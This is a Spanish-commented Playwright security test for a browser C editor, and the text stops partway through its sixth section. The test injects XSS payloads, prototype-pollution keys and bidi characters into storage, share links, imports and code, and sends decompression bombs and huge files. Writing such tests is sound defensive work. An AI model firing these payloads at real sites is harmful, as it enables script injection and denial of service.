// Auditoría de seguridad de lo que entra desde afuera: se intenta romper el editor de verdad, por cada camino.
// Caminos: valores de localStorage al arrancar, enlace #p=, importar JSON, abrir un .c, casos sin respuesta,
// código C con marcado HTML, service worker y política de seguridad de contenido (CSP).
// Falla si algún script inyectado se ejecuta, si queda marcado HTML activo en la página o si la página se rompe.
// uso: node tools/ui-seguridad.js   (necesita playwright; levanta un servidor local solo para la prueba)
const { chromium } = require('playwright');
const http = require('http'), fs = require('fs'), path = require('path'), zlib = require('zlib');
const root = path.join(__dirname, '..');
const PUERTO = 8766, BASE = 'http://localhost:' + PUERTO + '/';
const ARCHIVO = 'file://' + path.join(root, 'index.html'), UNICO = 'file://' + path.join(root, 'dist', 'editor-c.html');
let ok = 0, fallas = 0;
const check = (c, m) => { if (c) { ok++; console.log('  ok   ' + m); } else { fallas++; console.log('  FALLA ' + m); } };

// cargas: si alguna llega a un innerHTML sin escapar, o a un atributo, deja window.__pwn en la página
const CARGAS = [
  '"><img src=x onerror="window.__pwn=1">',
  '<svg onload="window.__pwn=1"></svg>',
  '<script>window.__pwn=1</script>',
  '\'><iframe srcdoc="<script>parent.__pwn=1</script>"></iframe>',
  '</pre></textarea></b><img src=x onerror=window.__pwn=1>',
  '<a href="javascript:window.__pwn=1" autofocus onfocus="window.__pwn=1">x</a>',
  '<details open ontoggle="window.__pwn=1">'
];
const P = CARGAS.join(' ');
const HOLA = '#include <stdio.h>\nint main() {\n    printf("hola %d\\n", 6 * 7);\n    return 0;\n}\n';

// ¿se ejecutó algo o quedó marcado activo? (el marcado propio de la página no tiene manejadores en línea ni iframes)
const estado = (pg) => pg.evaluate(() => ({
  pwn: window.__pwn || 0,
  activos: document.querySelectorAll('img[src="x"], iframe, [onerror], [onload], [onfocus], [ontoggle], [onclick], a[href^="javascript:"], body script:not([src]):not([data-propio])').length,
  proto: ({}).contaminado === undefined
}));
async function limpio(pg, que) {
  const e = await estado(pg);
  check(e.pwn === 0 && e.activos === 0 && e.proto, que + (e.pwn ? ' [SE EJECUTÓ UN SCRIPT]' : e.activos ? ' [quedó marcado HTML activo: ' + e.activos + ']' : !e.proto ? ' [Object.prototype contaminado]' : ''));
}
// la página sigue viva: se puede escribir un programa, ejecutarlo y ver la salida
async function viva(pg, que) {
  let sale = '';
  try {
    await pg.evaluate(() => document.querySelectorAll('dialog[open]').forEach((d) => d.close()));
    await pg.evaluate((src) => { window.__editorc.setCode(src); window.__editorc.run(); }, HOLA);
    await pg.waitForFunction(() => /hola 42/.test(document.getElementById('out').textContent), null, { timeout: 8000 });
    sale = 'hola 42';
  } catch (e) { sale = ''; }
  check(sale === 'hola 42', que);
}
function pagina(cx) {
  return cx.newPage().then((pg) => {
    pg.errores = []; pg.dialogos = 0;
    pg.on('pageerror', (e) => pg.errores.push(String(e && e.message)));
    pg.on('dialog', (d) => { pg.dialogos++; d.dismiss().catch(() => {}); });
    return pg;
  });
}
const sinErrores = (pg, que) => check(pg.errores.length === 0 && pg.dialogos === 0, que + (pg.errores.length ? ' [' + pg.errores.slice(0, 2).join(' | ').slice(0, 200) + ']' : ''));
const b64u = (buf) => Buffer.from(buf).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
const enlaceR = (obj) => '#p=r.' + b64u(Buffer.from(typeof obj === 'string' ? obj : JSON.stringify(obj), 'utf8'));
const enlaceZ = (buf) => '#p=z.' + b64u(zlib.deflateRawSync(buf, { level: 9 }));
const abrir = async (pg, sel, dlg) => { await pg.evaluate((s) => document.querySelector(s).click(), sel); if (dlg) await pg.waitForSelector(dlg + '[open]', { timeout: 4000 }); };
const cerrar = (pg) => pg.evaluate(() => document.querySelectorAll('dialog[open]').forEach((d) => d.close()));

// recorre todas las pantallas que muestran datos guardados o recibidos
async function recorrer(pg) {
  const pasos = [['#pname', '#dProgs'], ['#settings', '#dSet'], ['#casosBtn', '#dCasos'], ['#pruebas', '#dPru'], ['#exBtn', '#dEj'], ['#ayudaBtn', '#dAyuda'], ['#avisar', '#dCasos'], ['#shot', '#dShot']];
  const mal = [];
  for (const [b, d] of pasos) {
    try { await abrir(pg, b, d); await pg.waitForTimeout(d === '#dShot' ? 500 : 80); } catch (e) { mal.push(b); }
    await cerrar(pg);
  }
  return mal;
}

const srv = http.createServer((q, r) => {
  let f = path.join(root, decodeURIComponent(q.url.split('?')[0].split('#')[0])); if (f.endsWith(path.sep) || f.endsWith('/')) f += 'index.html';
  fs.readFile(f, (e, d) => {
    if (e) { r.writeHead(404); r.end(); return; }
    const t = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.json': 'application/json', '.svg': 'image/svg+xml', '.png': 'image/png', '.webmanifest': 'application/manifest+json', '.ttf': 'font/ttf', '.md': 'text/markdown' }[path.extname(f)] || 'application/octet-stream';
    r.writeHead(200, { 'content-type': t + (/^(text|application\/(json|manifest))/.test(t) ? '; charset=utf-8' : '') }); r.end(d);
  });
}).listen(PUERTO, async () => {
  const br = await chromium.launch();
  const VP = { viewport: { width: 1280, height: 800 } };
  try {
    /* ---------- 1) localStorage con valores hostiles al arrancar ---------- */
    console.log('1) valores guardados en el navegador (localStorage)');
    const juegos = {
      'cargas HTML en todos los campos': {
        'editorc.progs': JSON.stringify([
          { id: 'a1', name: P, code: '// ' + P + '\n' + HOLA, input: P, t: Date.now(), tests: [{ n: P, i: P }, { n: P, i: '1\n2' }] },
          { id: P, name: P + ' 2', code: P, input: P, t: 5 }
        ]),
        'editorc.cur': 'a1', 'editorc.user': JSON.stringify({ name: P, dni: P, curso: P, mat: P, ciclo: P }),
        'editorc.muted': JSON.stringify([P, 'W-' + P]), 'editorc.theme': P, 'editorc.fs': P, 'editorc.sang': P, 'editorc.ayuda': P, 'editorc.ws': '1',
        'editorc.split.row': P, 'editorc.split.col': P, 'editorc.code': P,
        'editor-c-casos': JSON.stringify([{ v: 1, fecha: P, version: P, nivel_ayuda: P, diag: { nivel: P, code: P, msg: P, line: P }, codigo: P, entrada: P, aviso: P }])
      },
      'tipos equivocados': {
        'editorc.progs': JSON.stringify([
          { id: 1, name: 12345, code: HOLA, input: { a: 1 }, t: 'ayer', tests: [null, 7, 'x', { n: {}, i: 5 }, { n: null, i: 'ok' }, { i: ['a'] }] },
          { id: 'b', name: { toString: 1 }, code: 'int x;', input: ['x'], t: null, tests: 'no' },
          { id: 'c', name: null, code: '', input: 0, tests: { length: 3 } },
          { id: 'd', code: HOLA }, null, 5, 'texto', [], { id: 'e', name: 'sin código' }
        ]),
        'editorc.cur': 'b', 'editorc.user': JSON.stringify({ name: { a: 1 }, dni: 123, curso: ['5'], mat: null, ciclo: true }),
        'editorc.muted': JSON.stringify({ a: 1, '<img src=x onerror=window.__pwn=1>': 2 }), 'editorc.fs': '1e9', 'editorc.sang': '-4',
        'editor-c-casos': JSON.stringify([{ v: 1, diag: { msg: 5, line: 'x', nivel: {} }, codigo: 'a', entrada: 42, fecha: 7, nivel_ayuda: {} }, { diag: {}, codigo: 'b', entrada: { replace: 1 }, version: ['x'] }, null, 3, { diag: null, codigo: 'x' }])
      },
      'JSON roto y claves especiales': {
        'editorc.progs': '[{"id":"a","name":"x","code":"int main() { }","__proto__":{"contaminado":1},"constructor":{"prototype":{"contaminado":1}}}', 'editorc.user': '{"__proto__":{"contaminado":1},"name":"A"}',
        'editorc.muted': '{{{{', 'editorc.cur': '__proto__', 'editor-c-casos': '[[[[', 'editorc.theme': '__proto__', 'editorc.ayuda': 'constructor'
      },
      'objeto con __proto__ y programa sin nombre': {
        'editorc.progs': '[{"id":"a","code":"int main() { }","__proto__":{"contaminado":1},"tests":[{"n":"t","i":"1","__proto__":{"contaminado":1}}]}]',
        'editorc.user': '{"__proto__":{"contaminado":1,"name":"Heredado"},"constructor":{"prototype":{"contaminado":1}}}', 'editorc.muted': '"texto"', 'editor-c-casos': '{"length":2}'
      }
    };
    for (const [nombre, datos] of Object.entries(juegos)) {
      const cx = await br.newContext(VP);
      await cx.addInitScript((d) => { try { if (!sessionStorage.getItem('__sembrado')) { sessionStorage.setItem('__sembrado', '1'); for (const k in d) localStorage.setItem(k, d[k]); } } catch (e) { /* nada */ } }, datos);
      const pg = await pagina(cx);
      await pg.goto(ARCHIVO); await pg.waitForSelector('#code');
      await pg.waitForFunction(() => window.KB && window.KB.cargado && window.Compartir && window.Nombres && window.Ordenar, null, { timeout: 8000 }).catch(() => {});
      const mal = await recorrer(pg);
      check(mal.length === 0, nombre + ': se abren todas las pantallas' + (mal.length ? ' [no abrió: ' + mal.join(', ') + ']' : ''));
      // «Ejecutar todas» las pruebas guardadas y la captura de las pruebas
      try { await abrir(pg, '#pruebas', '#dPru'); if (await pg.$eval('#pruRun', (b) => !b.disabled)) { await pg.click('#pruRun'); await pg.waitForFunction(() => /prueba/.test(document.getElementById('pruEstado').textContent) && !/Ejecutando/.test(document.getElementById('pruEstado').textContent), null, { timeout: 30000 }); } } catch (e) { check(false, nombre + ': «Ejecutar todas» termina [' + String(e.message).slice(0, 80) + ']'); }
      await cerrar(pg);
      await limpio(pg, nombre + ': nada se ejecuta ni queda marcado activo');
      await viva(pg, nombre + ': el editor sigue funcionando');
      // guardar .c con ese nombre de programa y armar la cabecera no rompe
      const guardo = await pg.evaluate(() => { try { document.getElementById('save').click(); return true; } catch (e) { return String(e); } });
      check(guardo === true, nombre + ': «Guardar .c» no falla');
      sinErrores(pg, nombre + ': sin errores de la página');
      await cx.close();
    }

    /* ---------- 2) enlace #p= ---------- */
    console.log('2) enlace «Pasar a otro dispositivo» (#p=)');
    {
      const cx = await br.newContext(VP);
      const casos = [
        ['nombre y código con cargas HTML', enlaceR({ v: 1, n: P, c: '// ' + P + '\n' + HOLA, i: P }), true],
        ['nombre que no es texto (objeto)', enlaceR({ v: 1, n: { toString: P, a: [P] }, c: HOLA }), true],
        ['nombre que no es texto (arreglo)', enlaceR({ v: 1, n: [P, P], c: HOLA, i: { x: 1 } }), true],
        ['claves __proto__ y constructor', enlaceR('{"v":1,"n":"x","c":"int main() { }","__proto__":{"contaminado":1},"constructor":{"prototype":{"contaminado":1}}}'), true],
        ['comprimido con cargas', enlaceZ(Buffer.from(JSON.stringify({ v: 1, n: P, c: P, i: P }))), true]
      ];
      for (const [nombre, hash, abre] of casos) {
        const pg = await pagina(cx);
        await pg.goto(BASE + 'index.html' + hash); await pg.waitForSelector('#code');
        const abrio = await pg.waitForSelector('#dRecibido[open]', { timeout: 5000 }).then(() => true, () => false);
        check(abrio === abre, nombre + ': muestra la vista previa antes de abrir');
        await limpio(pg, nombre + ': la vista previa no ejecuta nada');
        if (abrio) {
          await pg.click('#recOk'); await pg.waitForTimeout(200);
          const mal = await recorrer(pg);
          check(mal.length === 0, nombre + ': después de abrirlo, todas las pantallas funcionan' + (mal.length ? ' [' + mal.join(', ') + ']' : ''));
          await abrir(pg, '#enlace', '#dEnlace').catch(() => {}); await cerrar(pg);
          await limpio(pg, nombre + ': el programa abierto no ejecuta nada');
        }
        await viva(pg, nombre + ': el editor sigue funcionando');
        sinErrores(pg, nombre + ': sin errores de la página');
        await pg.close();
      }
      // nombre recibido: sin caracteres de control ni marcas que cambian el sentido del texto
      {
        const pg = await pagina(cx);
        await pg.goto(BASE + 'index.html' + enlaceR({ v: 1, n: 'Tarea\u202egpj.exe\u0000\u0007\n\r\u2028Fin' + 'x'.repeat(300), c: HOLA })); await pg.waitForSelector('#dRecibido[open]', { timeout: 5000 });
        await pg.click('#recOk'); await pg.waitForTimeout(150);
        const nm = await pg.$eval('#pnameTxt', (n) => n.textContent);
        check(!/[\u0000-\u001f\u007f\u202a-\u202e\u2066-\u2069\u2028\u2029]/.test(nm) && nm.length <= 60, 'el nombre recibido queda sin caracteres de control ni marcas de dirección, y con largo acotado (' + nm.length + ')');
        await pg.close();
      }
      // enlaces dañados, gigantes y bombas de descompresión: nada se abre, la página responde y no se cuelga
      const malos = [
        ['base64 inválido', '#p=z.AAAA'], ['prefijo desconocido', '#p=q.AAAA'], ['caracteres raros', '#p=r.<img src=x onerror=window.__pwn=1>'], ['vacío', '#p='],
        ['JSON que no es objeto', enlaceR('"hola"')], ['sin código', enlaceR({ v: 1, n: 'x' })], ['código que no es texto', enlaceR({ v: 1, n: 'x', c: { a: 1 } })],
        ['código demasiado largo', enlaceR({ v: 1, n: 'x', c: 'a'.repeat(40000) })],
        ['JSON anidado 100.000 veces', enlaceR('['.repeat(100000) + ']'.repeat(100000))],
        ['enlace sin comprimir de 1,5 MB', '#p=r.' + 'A'.repeat(1500000)],
        ['bomba de descompresión (300 MB de ceros en 300 KB)', enlaceZ(Buffer.alloc(300 * 1024 * 1024))],
        ['bomba de descompresión de JSON válido', enlaceZ(Buffer.from('{"v":1,"n":"x","c":"' + 'a'.repeat(60 * 1024 * 1024) + '"}'))]
      ];
      for (const [nombre, hash] of malos) {
        const pg = await pagina(cx);
        const t0 = Date.now();
        await pg.goto(BASE + 'index.html' + hash); await pg.waitForSelector('#code');
        await pg.waitForFunction(() => { const t = document.getElementById('toast'); return (t && !t.hidden) || document.querySelector('#dRecibido[open]'); }, null, { timeout: 15000 }).catch(() => {});
        const seg = (Date.now() - t0) / 1000;
        const abrio = await pg.evaluate(() => !!document.querySelector('#dRecibido[open]'));
        const aviso = await pg.evaluate(() => { const t = document.getElementById('toast'); return t && !t.hidden ? t.textContent : ''; });
        const mem = await pg.evaluate(() => (performance.memory ? performance.memory.usedJSHeapSize : 0));
        check(!abrio && /enlace/.test(aviso), 'enlace malo (' + nombre + '): no abre nada y avisa');
        check(seg < 10 && mem < 200e6, 'enlace malo (' + nombre + '): responde en ' + seg.toFixed(1) + ' s y usa ' + Math.round(mem / 1e6) + ' MB');
        check((await pg.evaluate(() => location.hash)) === '', 'enlace malo (' + nombre + '): la parte # se borra de la barra');
        await limpio(pg, 'enlace malo (' + nombre + '): no ejecuta nada');
        sinErrores(pg, 'enlace malo (' + nombre + '): sin errores de la página');
        await pg.close();
      }
      // al armar un enlace, una entrada enorme no produce un enlace enorme
      {
        const pg = await pagina(cx);
        await pg.goto(BASE + 'index.html'); await pg.waitForSelector('#code');
        await pg.evaluate((src) => { window.__editorc.setCode(src); const i = document.getElementById('inTxt'); i.value = 'x'.repeat(3000000); i.dispatchEvent(new Event('input', { bubbles: true })); }, HOLA);
        await pg.waitForTimeout(500);
        await pg.evaluate(() => document.getElementById('enlace').click()); await pg.waitForTimeout(800);
        const largo = await pg.evaluate(() => (document.querySelector('#dEnlace[open]') ? document.getElementById('enlUrl').value.length : 0));
        check(largo < 40000, 'armar un enlace con 3 MB de datos de entrada no produce un enlace gigante (' + largo + ' caracteres)');
        await pg.close();
      }
      await cx.close();
    }

    /* ---------- 3) importar JSON ---------- */
    console.log('3) importar programas (.json)');
    {
      const cx = await br.newContext(VP);
      const importar = async (pg, nombreArchivo, contenido, confirmar) => {
        await pg.setInputFiles('#fileJson', { name: nombreArchivo, mimeType: 'application/json', buffer: Buffer.isBuffer(contenido) ? contenido : Buffer.from(contenido) });
        const abre = await pg.waitForSelector('#dImp[open]', { timeout: 4000 }).then(() => true, () => false);
        if (abre && confirmar) { if (await pg.$eval('#impOk', (b) => !b.hidden)) await pg.click('#impOk'); else await cerrar(pg); await pg.waitForTimeout(200); }
        return abre;
      };
      const exp = (programs, extra) => JSON.stringify(Object.assign({ app: 'editor-c', version: 1, exported: new Date().toISOString(), programs }, extra || {}));
      {
        const pg = await pagina(cx);
        await pg.goto(ARCHIVO); await pg.waitForSelector('#code');
        const abre = await importar(pg, P + '.json', exp([
          { name: P, code: '// ' + P + '\n' + HOLA, input: P, t: 1, tests: [{ n: P, i: P }, { n: 'Dos', i: '3\n4' }] },
          { name: 'Con pruebas', code: HOLA, input: '', t: 2, tests: [{ n: 'Caso A', i: '10' }, { n: 'Caso B', i: '20' }] },
          { name: { a: 1 }, code: HOLA }, { name: 'sin código' }, null, 7, { name: '   ', code: 'x' }, { name: 'tipos', code: HOLA, input: { a: 1 }, t: 'x', tests: [null, 5, { n: {}, i: {} }, { n: 1, i: 'vale' }] },
          { name: '\u0000\u0007ctl\u202eoculto', code: HOLA }
        ]), true);
        check(abre, 'importar con cargas HTML: muestra el resumen antes de agregar');
        await limpio(pg, 'importar con cargas HTML: el resumen y la lista no ejecutan nada');
        // el programa con cargas queda abierto en algún momento: se recorre todo
        await abrir(pg, '#pname', '#dProgs');
        const nombres = await pg.$$eval('#plist li b', (l) => l.map((b) => b.textContent));
        check(nombres.some((n) => n.indexOf('<img') >= 0), 'importar: el nombre con marcado se ve como texto en la lista');
        check(!nombres.some((n) => /[\u0000-\u001f\u202a-\u202e]/.test(n)), 'importar: los nombres quedan sin caracteres de control ni marcas de dirección');
        await pg.evaluate(() => { const b = Array.from(document.querySelectorAll('#plist li button.open')).find((x) => x.querySelector('b').textContent === 'Con pruebas'); b.click(); });
        await pg.waitForTimeout(150);
        await abrir(pg, '#pruebas', '#dPru');
        const pruebas = await pg.$$eval('#pruList li input', (l) => l.map((i) => i.value));
        check(pruebas.length === 2 && pruebas[0] === 'Caso A' && pruebas[1] === 'Caso B', 'importar: las pruebas guardadas viajan con el programa (' + pruebas.join(', ') + ')');
        await cerrar(pg);
        const mal = await recorrer(pg);
        check(mal.length === 0, 'importar: después, todas las pantallas funcionan' + (mal.length ? ' [' + mal.join(', ') + ']' : ''));
        await limpio(pg, 'importar con cargas HTML: nada se ejecuta');
        await viva(pg, 'importar con cargas HTML: el editor sigue funcionando');
        sinErrores(pg, 'importar con cargas HTML: sin errores de la página');
        await pg.close();
      }
      {
        const pg = await pagina(cx);
        await pg.goto(ARCHIVO); await pg.waitForSelector('#code');
        const rechazos = [
          ['no es JSON', '{{{'], ['otra aplicación', JSON.stringify({ app: 'otra', version: 1, programs: [] })], ['versión desconocida', exp([], { version: 2 })], ['sin lista', JSON.stringify({ app: 'editor-c', version: 1 })],
          ['demasiados programas', exp(Array.from({ length: 1001 }, (x, i) => ({ name: 'p' + i, code: 'x' })))], ['claves especiales', '{"app":"editor-c","version":1,"programs":[],"__proto__":{"contaminado":1}}'],
          ['anidado 100.000 veces', '['.repeat(100000) + ']'.repeat(100000)], ['archivo de 26 MB', Buffer.alloc(26 * 1024 * 1024, 0x20)]
        ];
        for (const [nombre, txt] of rechazos) {
          const abre = await importar(pg, 'x.json', txt, false);
          const aviso = await pg.evaluate(() => { const t = document.getElementById('toast'); return t && !t.hidden ? t.textContent : ''; });
          check(!abre && aviso.length > 0, 'importar rechazado (' + nombre + '): no abre el resumen y avisa');
          await pg.evaluate(() => { const t = document.getElementById('toast'); if (t) t.hidden = true; });
        }
        // un archivo válido que no entra en el almacenamiento del navegador: no deja el editor sin poder guardar
        const antes = await pg.evaluate(() => JSON.parse(localStorage.getItem('editorc.progs') || '[]').length);
        await importar(pg, 'grande.json', exp(Array.from({ length: 12 }, (x, i) => ({ name: 'Grande ' + i, code: '// ' + String(i) + '\n' + 'a'.repeat(900000) }))), true);
        await pg.waitForTimeout(600);
        const aviso = await pg.evaluate(() => { const t = document.getElementById('toast'); return t && !t.hidden ? t.textContent : ''; });
        await pg.evaluate((src) => { window.__editorc.setCode(src + '// después\n'); }, HOLA); await pg.waitForTimeout(700);
        const guardado = await pg.evaluate(() => { const l = JSON.parse(localStorage.getItem('editorc.progs') || '[]'); return { n: l.length, tiene: l.some((p) => /\/\/ después/.test(p.code)) }; });
        check(/espacio|no se import|No se pudo/i.test(aviso), 'importar más de lo que entra en el navegador: avisa que no hay espacio (' + aviso.slice(0, 60) + ')');
        check(guardado.tiene && guardado.n === antes, 'importar más de lo que entra: no se agrega a medias y lo que se escribe después se sigue guardando');
        await limpio(pg, 'importar rechazado: nada se ejecuta');
        await viva(pg, 'importar rechazado: el editor sigue funcionando');
        sinErrores(pg, 'importar rechazado: sin errores de la página');
        await pg.close();
      }
      await cx.close();
    }

    /* ---------- 4) abrir un archivo .c ---------- */
    console.log('4) abrir un archivo .c');
    {
      const cx = await br.newContext(VP);
      const pg = await pagina(cx);
      await pg.goto(ARCHIVO); await pg.waitForSelector('#code');
      await pg.setInputFiles('#file', { name: P.replace(/\//g, '∕') + '.c', mimeType: 'text/plain', buffer: Buffer.from('// ' + P + '\r\n' + HOLA) });
      await pg.waitForTimeout(300);
      check((await pg.inputValue('#code')).indexOf('<img') >= 0, 'abrir .c: el archivo con marcado se carga como texto');
      const mal = await recorrer(pg);
      check(mal.length === 0, 'abrir .c con nombre hostil: todas las pantallas funcionan' + (mal.length ? ' [' + mal.join(', ') + ']' : ''));
      await limpio(pg, 'abrir .c con nombre y contenido hostiles: nada se ejecuta');
      const nm = await pg.$eval('#pnameTxt', (n) => n.textContent);
      check(nm.length <= 60, 'abrir .c: el nombre del programa queda acotado (' + nm.length + ' caracteres)');
      // binario y archivo enorme
      await pg.setInputFiles('#file', { name: 'foto.png', mimeType: 'image/png', buffer: Buffer.from(Array.from({ length: 4000 }, (x, i) => (i * 37) & 255)) });
      await pg.waitForTimeout(300);
      await limpio(pg, 'abrir un archivo binario: nada se ejecuta');
      const n0 = await pg.evaluate(() => JSON.parse(localStorage.getItem('editorc.progs') || '[]').length);
      const t0 = Date.now();
      await pg.setInputFiles('#file', { name: 'enorme.c', mimeType: 'text/plain', buffer: Buffer.alloc(40 * 1024 * 1024, 0x61) });
      await pg.waitForTimeout(1500);
      const aviso = await pg.evaluate(() => { const t = document.getElementById('toast'); return t && !t.hidden ? t.textContent : ''; });
      const largo = await pg.evaluate(() => document.getElementById('code').value.length);
      check(largo < 2e6 && /grande/i.test(aviso), 'abrir un .c de 40 MB: se rechaza con un aviso y no se carga (' + (largo / 1e6).toFixed(1) + ' MB en el editor, ' + ((Date.now() - t0) / 1000).toFixed(1) + ' s)');
      check((await pg.evaluate(() => JSON.parse(localStorage.getItem('editorc.progs') || '[]').length)) === n0, 'abrir un .c de 40 MB: no agrega un programa');
      await viva(pg, 'abrir archivos hostiles: el editor sigue funcionando');
      sinErrores(pg, 'abrir archivos hostiles: sin errores de la página');
      await cx.close();
    }

    /* ---------- 5) código C con marcado: capas del editor, mensajes, consola, ayuda ---------- */
    console.log('5) código del alumno con marcado HTML e identificadores raros');
    {
      const cx = await br.newContext(VP);
      await cx.addInitScript(() => { try { localStorage.setItem('editorc.ayuda', '2'); localStorage.setItem('editorc.gccingles', '1'); localStorage.setItem('editorc.ws', '1'); } catch (e) { /* nada */ } });
      const pg = await pagina(cx);
      await pg.goto(ARCHIVO); await pg.waitForSelector('#code');
      await pg.waitForFunction(() => window.KB && window.KB.cargado && window.Nombres, null, { timeout: 8000 }).catch(() => {});
      const fuentes = [
        // marcado suelto, en comentarios, textos, directivas y con espacios y tabulaciones visibles
        '\t' + P + '\n  // ' + P + '\n/* ' + P + ' */\n#include <' + P + '>\n#define X ' + P + '\nint main() {\n\tprintf("' + P.replace(/"/g, '\\"') + '");\n  ' + P + ' = 3;\n}\n',
        // identificadores que no existen (van al mensaje) y nombres que chocan con los de JavaScript
        '#include <stdio.h>\nint main() {\n    onerror = constructor + __proto__ + toString;\n    hasOwnProperty(valueOf);\n    printf("%d", img_src_x_onerror);\n    return 0;\n}\n',
        '#include <stdio.h>\nint constructor(int toString) { return toString * 2; }\nint main() {\n    int __proto__ = 3, valueOf = 4, hasOwnProperty = 5;\n    printf("%d %d %d\\n", constructor(__proto__), valueOf, hasOwnProperty);\n    return 0;\n}\n',
        // el programa imprime marcado y lo lee de la entrada
        '#include <stdio.h>\nint main() {\n    char S[400];\n    printf("<img src=x onerror=window.__pwn=1><script>window.__pwn=1</script>\\n");\n    scanf("%399[^\\n]", S);\n    printf("%s\\n", S);\n    puts("</pre><svg onload=window.__pwn=1>");\n    return 0;\n}\n'
      ];
      for (let k = 0; k < fuentes.length; k++) {
        await pg.evaluate(([src, ent]) => { window.__editorc.setCode(src); const i = document.getElementById('inTxt'); i.value = ent; i.dispatchEvent(new Event('input', { bubbles: true })); window.__editorc.run(); }, [fuentes[k], P]);
        await pg.waitForFunction(() => /No se pudo ejecutar|Programa terminado|Error al ejecutar/.test(document.getElementById('out').textContent), null, { timeout: 8000 }).catch(() => {});
        // buscar (pinta coincidencias), pareja de paréntesis, «¿qué es esto?» en cada posición, modo lectura y ordenar
        await pg.evaluate(() => { document.getElementById('findBtn').click(); const q = document.getElementById('fq'); q.value = '<'; q.dispatchEvent(new Event('input')); q.value = 'onerror'; q.dispatchEvent(new Event('input')); document.getElementById('fclose').click(); });
        const largo = fuentes[k].length;
        await pg.evaluate((n) => { const ta = document.getElementById('code'); ta.focus(); for (let i = 0; i <= n; i += 3) { ta.setSelectionRange(i, i); document.dispatchEvent(new Event('selectionchange')); ta.dispatchEvent(new KeyboardEvent('keydown', { key: 'F1', bubbles: true, cancelable: true })); } document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true })); }, largo);
        await pg.evaluate(() => { document.getElementById('readBtn').click(); document.getElementById('readBtn').click(); document.getElementById('ordenar').click(); });
        await abrir(pg, '#avisar', '#dCasos').catch(() => {}); await cerrar(pg);
        await abrir(pg, '#shot', '#dShot').catch(() => {}); await pg.waitForTimeout(300); await cerrar(pg);
        await limpio(pg, 'código hostil ' + (k + 1) + ': resaltado, buscar, problemas, «¿qué es esto?», consola y captura no ejecutan nada');
      }
      const salida = await pg.$eval('#out', (o) => o.textContent);
      check(salida.indexOf('<script>window.__pwn=1</script>') >= 0 && salida.indexOf('<svg onload') >= 0, 'lo que imprime el programa se ve como texto, tal cual');
      // el tercer programa (nombres de JavaScript) da lo mismo que gcc: 6 4 5
      await pg.evaluate((src) => { window.__editorc.setCode(src); window.__editorc.run(); }, fuentes[2]);
      await pg.waitForFunction(() => /Programa terminado/.test(document.getElementById('out').textContent), null, { timeout: 8000 }).catch(() => {});
      check(/^6 4 5\n/.test(await pg.$eval('#out', (o) => o.textContent)), 'variables y funciones llamadas constructor, __proto__, toString… funcionan como en gcc');
      // «¿qué es esto?» sobre un nombre como toString: explica la variable del alumno, no un objeto interno
      const burbuja = await pg.evaluate((src) => { window.__editorc.setCode(src); const ta = document.getElementById('code'); const p = src.indexOf('toString * 2') + 2; ta.focus(); ta.setSelectionRange(p, p); ta.dispatchEvent(new KeyboardEvent('keydown', { key: 'F1', bubbles: true, cancelable: true })); const b = document.getElementById('bubble'); return b.hidden ? '' : b.textContent; }, fuentes[2]);
      check(/toString/.test(burbuja) && !/native code|undefined/.test(burbuja), '«¿qué es esto?» sobre un parámetro llamado toString explica el nombre del alumno');
      // buscador de la ayuda con marcado
      await abrir(pg, '#ayudaBtn', '#dAyuda');
      await pg.evaluate((q) => { const a = document.getElementById('aQ'); for (const t of [q, 'constructor', '__proto__', 'toString valueOf', 'scanf']) { a.value = t; a.dispatchEvent(new Event('input')); } }, P);
      check((await pg.$$eval('#aList li', (l) => l.length)) > 0, 'el buscador de la ayuda sigue respondiendo después de consultas raras');
      await cerrar(pg);
      await limpio(pg, 'ayuda con consultas hostiles: nada se ejecuta');
      // dentro del Worker donde corre el programa no hay red ni almacenamiento (se mira mientras un programa espera un dato)
      await pg.evaluate(() => { const i = document.getElementById('inTxt'); i.value = ''; i.dispatchEvent(new Event('input', { bubbles: true })); window.__editorc.setCode('#include <stdio.h>\nint main() {\n    int X;\n    scanf("%d", &X);\n    printf("%d\\n", X * 2);\n    return 0;\n}\n'); window.__editorc.run(); });
      await pg.waitForSelector('#out .stdin input', { timeout: 8000 });
      const w = pg.workers()[pg.workers().length - 1];
      const dentro = w ? await w.evaluate(() => ['fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'importScripts', 'caches', 'indexedDB', 'BroadcastChannel', 'Worker'].filter((k) => typeof self[k] !== 'undefined')) : ['sin Worker'];
      check(dentro.length === 0, 'el Worker del programa no tiene red ni almacenamiento' + (dentro.length ? ' [quedan: ' + dentro.join(', ') + ']' : ''));
      await pg.fill('#out .stdin input', '21'); await pg.press('#out .stdin input', 'Enter');
      await pg.waitForFunction(() => /42\n/.test(document.getElementById('out').textContent), null, { timeout: 5000 }).catch(() => {});
      check(/42\n/.test(await pg.$eval('#out', (o) => o.textContent)), 'y aun así el programa lee y escribe normalmente');
      await viva(pg, 'código hostil: el editor sigue funcionando');
      sinErrores(pg, 'código hostil: sin errores de la página');
      await cx.close();
    }

    /* ---------- 6) casos sin respuesta y «Avisar a Diego» ---------- */
    console.log('6) casos sin respuesta y «Avisar a Diego»');
    {
      const cx = await br.newContext(VP);
      const pg = await pagina(cx);
      await pg.goto(ARCHIVO); await pg.waitForSelector('#code');
      await pg.waitForFunction(() => window.Compartir, null, { timeout: 8000 });
      // un carácter suelto de un par (queda así al importar o recibir un programa) rompía el armado del enlace de WhatsApp
      await pg.evaluate(() => { window.__editorc.setCode('#include <stdio.h>\nint main() {\n    printf("\ud83d rota \udc00\\n");\n    return 0;\n}\n'); const i = document.getElementById('inTxt'); i.value = 'dato \ud800'; i.dispatchEvent(new Event('input', { bubbles: true })); });
      await pg.evaluate(() => document.getElementById('avisar').click());
      const abre = await pg.waitForSelector('#dCasos[open]', { timeout: 3000 }).then(() => true, () => false);
      check(abre, '«Avisar a Diego» abre aunque el programa tenga medio carácter (par suelto)');
      const href = await pg.evaluate(() => document.getElementById('cWa').getAttribute('href') || '');
      check(/^https:\/\/wa\.me\/\d*\?text=/.test(href), 'el enlace de WhatsApp se arma y solo apunta a wa.me (' + href.slice(0, 28) + '…)');
      await pg.evaluate((p) => { const n = document.getElementById('cNota2'); n.value = p + ' \ud800'; n.dispatchEvent(new Event('input', { bubbles: true })); }, P);
      const href2 = await pg.evaluate(() => document.getElementById('cWa').getAttribute('href') || '');
